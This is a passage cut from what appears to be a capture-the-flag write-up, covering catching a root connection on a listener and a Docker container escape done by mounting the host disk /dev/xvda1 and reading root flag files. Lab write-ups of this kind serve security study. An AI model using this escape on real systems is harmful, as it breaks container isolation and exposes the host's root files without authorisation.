</p><p id="ddfe52fa-27d6-415b-b9b8-e8b15a51a7ca" class="">Your listener will receive a connection and you can <code>cat /root/root.txt</code></p><p id="5b24b641-9bcb-4b6f-b447-118e7c5c5550" class="">
</p><p id="259deb2f-d599-46cf-bda9-73619cb166a7" class=""><strong>Escaping Docker ( Root #2 )</strong></p><p id="318ba69f-72fa-4d26-a58a-3938fa9f02dd" class="">Before with <code>findmnt</code> we saw an interesting directory lets mount it.</p><p id="abec80bb-e646-42a0-971b-d62c517a6772" class="">
</p><pre id="2f097911-35f6-4e83-aab7-5f3e37337ac7" class="code code-wrap"><code>mkdir -p /tmp/mnt
mount /dev/xvda1 /tmp/mnt

# Now we mounted the virtual storage. We escaped the container and got the other flag.

cat /tmp/mnt/root/root.txt
</code></pre><p id="86ce9c92-ee1e-4e33-ad27-1e27103f4ffb" class="">
</p><p id="0c50d2a1-c5a0-45a1-a5d3-2bd20b7c453c" class="">
</p></div></article></body></html>
